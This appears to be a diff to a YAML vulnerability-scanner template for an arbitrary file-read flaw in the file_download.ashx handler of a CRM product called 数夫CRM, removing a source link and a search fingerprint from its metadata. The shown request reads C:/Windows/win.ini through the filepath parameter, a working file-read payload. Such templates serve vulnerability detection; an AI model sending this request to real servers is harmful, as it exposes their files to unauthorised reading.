@@ -3,12 +3,8 @@ info:
   name: 数夫CRM file_download存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lopb8rcganb5hb07'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lopb8rcganb5hb07
-    fofa: icon_hash="-244202779"
 http:
 - raw:
   - 'GET /Web/common/Handler/file_download.ashx?filepath=C:/Windows/win.ini HTTP/1.1
